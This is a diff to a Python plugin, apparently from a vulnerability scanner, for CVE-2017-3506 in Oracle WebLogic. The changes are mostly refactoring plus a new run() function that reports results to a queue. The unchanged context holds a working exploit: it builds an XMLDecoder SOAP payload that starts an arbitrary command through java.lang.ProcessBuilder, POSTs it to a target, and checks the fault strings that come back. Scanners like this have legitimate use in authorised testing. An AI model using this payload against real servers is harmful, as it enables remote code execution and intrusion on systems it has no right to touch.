@@ -5,11 +5,13 @@
 # updated 2019/11/1
 # by 0xn0ne
 
-from stars import universe, Star, target_type
+from stars import target_type, Star
 from utils import http
+from multiprocessing.managers import SyncManager
+from typing import Any, Dict, List, Mapping, Tuple, Union
 
 
-@universe.groups()
+# @universe.groups()
 class CVE_2017_3506(Star):
     info = {
         'NAME': '',
@@ -29,7 +31,8 @@ class CVE_2017_3506(Star):
               <array class="java.lang.String" length="3">
                 '''
         for idx, it in enumerate(cmd.split()):
-            data += '<void index="{}"><string>{}</string></void>'.format(idx, it)
+            data += '<void index="{}"><string>{}</string></void>'.format(
+                idx, it)
         data += '''
               </array>
               <void method="start"/>
@@ -44,3 +47,18 @@ class CVE_2017_3506(Star):
         res, data = http(url, 'POST', headers, data=data, ssl=force_ssl)
         return res != None and ('<faultstring>java.lang.ProcessBuilder' in res.text or "<faultstring>0" in res.text), {
             'msg': 'finish.'}
+
+
+def run(queue: SyncManager.Queue, data: Dict):
+    obj = CVE_2017_3506()
+    result = {
+        'IP': data['IP'],
+        'PORT': data['PORT'],
+        'NAME': obj.info['CVE'] if obj.info['CVE'] else obj.info['NAME'],
+        'MSG': '',
+        'STATE': False
+    }
+    result['STATE'], result['MSG'] = obj.light_and_msg(
+        data['IP'], data['PORT'], data['IS_SSL'])
+
+    queue.put(result)
